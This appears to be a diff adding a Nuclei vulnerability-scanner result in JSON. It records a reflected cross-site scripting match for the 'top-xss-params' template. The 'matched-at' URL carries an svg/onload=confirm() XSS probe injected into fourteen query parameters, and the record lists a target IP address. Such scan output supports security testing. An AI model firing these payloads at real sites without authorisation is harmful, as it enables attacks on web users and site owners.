@@ -1,0 +1,39 @@
+{
+    "template": "vulnerabilities/generic/top-xss-params.yaml",
+    "template-url": "https://github.com/projectdiscovery/nuclei-templates/blob/main/vulnerabilities/generic/top-xss-params.yaml",
+    "template-id": "top-xss-params",
+    "template-path": "/home/ubuntu/nuclei-templates/vulnerabilities/generic/top-xss-params.yaml",
+    "info": {
+        "name": "Top 38 Parameters - Cross-Site Scripting",
+        "author": [
+            "foulenzer",
+            "geeknik"
+        ],
+        "tags": [
+            "xss",
+            "generic"
+        ],
+        "description": "Cross-sitescriptingwasdiscoveredviaasearchforreflectedparametervaluesintheserverresponseviaGET-requests.",
+        "reference": null,
+        "severity": "high",
+        "metadata": {
+            "parameters": "q,s,search,id,action,keyword,query,page,keywords,url,view,cat,name,key,p,month,page_id,password,terms,token,type,unsubscribe_token,api,api_key,begindate,callback,categoryid,csrf_token,email,emailto,enddate,immagine,item,jsonp,l,lang,list_type,year"
+        },
+        "classification": {
+            "cve-id": null,
+            "cwe-id": [
+                "cwe-79"
+            ],
+            "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N",
+            "cvss-score": 7.2
+        }
+    },
+    "type": "http",
+    "host": "http://i.cz",
+    "matched-at": "http://example.com/?api='>\"<svg/onload=confirm('api')>&api_key='>\"<svg/onload=confirm('api_key')>&begindate='>\"<svg/onload=confirm('begindate')>&callback='>\"<svg/onload=confirm('callback')>&categoryid='>\"<svg/onload=confirm('categoryid')>&csrf_token='>\"<svg/onload=confirm('csrf_token')>&email='>\"<svg/onload=confirm('email')>&emailto='>\"<svg/onload=confirm('emailto')>&enddate='>\"<svg/onload=confirm('enddate')>&immagine='>\"<svg/onload=confirm('immagine')>&item='>\"<svg/onload=confirm('item')>&jsonp='>\"<svg/onload=confirm('jsonp')>&l='>\"<svg/onload=confirm('l')>&list_type='>\"<svg/onload=confirm('list_type')>",
+    "extracted-results": [],
+    "ip": "112.231.131.5",
+    "timestamp": "2023-05-08T16:16:06.737413763Z",
+    "matcher-status": true,
+    "matched-line": null
+}
